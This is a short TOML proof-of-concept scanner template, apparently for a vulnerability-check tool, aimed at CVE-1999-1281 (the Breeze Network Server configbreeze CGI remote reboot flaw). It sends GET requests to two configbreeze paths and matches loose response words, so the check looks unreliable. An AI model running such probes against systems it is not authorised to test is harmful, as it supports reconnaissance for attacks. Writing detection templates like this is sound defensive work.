[info]
author = "ave"
description = "Breeze Network Server 开发版 configbreeze CGI 远程系统重启漏洞验证。向目标服务器的 configbreeze CGI 脚本发送 GET 请求，返回的 CGI 响应表明目标存在该 CGI 端点，可能导致远程系统重启。"
id = "POC-AVE-1999-1449"
name = "CVE-1999-1281 Breeze Network Server Remote Reboot PoC"
severity = "medium"
tags = ["ave-1999-1449"]
vuln_id = [
    "CVE-1999-1281",
    "AVE-1999-1449",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin/configbreeze"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "200",
    "Content-Type",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/configbreeze"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "200",
    "Content-Type",
]
